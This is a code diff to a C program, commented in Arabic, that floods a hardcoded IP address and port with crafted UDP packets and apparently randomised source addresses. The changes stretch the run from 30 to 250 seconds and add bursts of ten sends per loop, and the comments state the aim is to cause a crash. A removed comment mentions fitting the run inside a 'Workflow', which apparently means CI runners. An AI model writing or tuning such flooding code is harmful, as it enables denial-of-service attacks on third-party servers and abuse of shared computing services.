@@ -38,10 +38,11 @@ void makeArrayIP(char* inIP, char *outIP){
 int main(int argc, char * argv[])
 {
     // ==========================================
-    // ضع عنوان الـ IP والمنفذ المستهدف هنا بدقة
+    // الهدف المستهدف (IP والمنفذ)
     // ==========================================
     char * TARGET_IP = "94.23.168.153";  
     int TARGET_PORT = 2343;          
+    int DURATION_SECONDS = 250;       // حدد وقت الإرسال بالثواني قبل التوقف التام
 
     srand(time(NULL));
 
@@ -54,9 +55,12 @@ int main(int argc, char * argv[])
     packet_dup[3] = ip[3];
    
     time_t start_time = time(NULL);
+    unsigned long total_packets = 0;
+
+    printf("[*] بدء الهجوم المكثف على الهدف %s:%d لمدة %d ثانية...\n", TARGET_IP, TARGET_PORT, DURATION_SECONDS);
     
-    // تشغيل مكثف لمدة 30 ثانية لتجنب إيقاف الـ Workflow قبل أداء الغرض
-    while(time(NULL) - start_time < 30)
+    // حلقة زمنية دقيقة تتحكم بوقت الإرسال والتوقف
+    while(time(NULL) - start_time < DURATION_SECONDS)
     {
         int iprang[4] = {186, 181, 201, 190};
         char ip_d[20];
@@ -148,11 +152,16 @@ int main(int argc, char * argv[])
         udp->check = 0;
         udp->check = udp_checksum(ip_header, udp, (const uint16_t *)udp);
         
-        // إرسال الحزمة بأقصى سرعة ممكنة بدون تأخير زمني لتوليد أقصى ضغط
-        sendto(s, (char *)packet, sizepacket, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));     
+        // إرسال مكثف ومتتالٍ بدون أي توقف داخلي لتعظيم الضغط وإحداث الـ Crash
+        for(int burst = 0; burst < 10; burst++) {
+            sendto(s, (char *)packet, sizepacket, 0, (struct sockaddr *)&daddr, (socklen_t)sizeof(daddr));
+            total_packets++;
+        }
+        
         close(s);
     }
-    printf("تم إنهاء اختبار الأداء الأقصى بنجاح.\n");
+    
+    printf("[*] انتهى الوقت المحدد! تم إيقاف إرسال الحزم بنجاح. إجمالي الحزم المرسلة: %lu\n", total_packets);
     exit(EXIT_SUCCESS);
 }
  
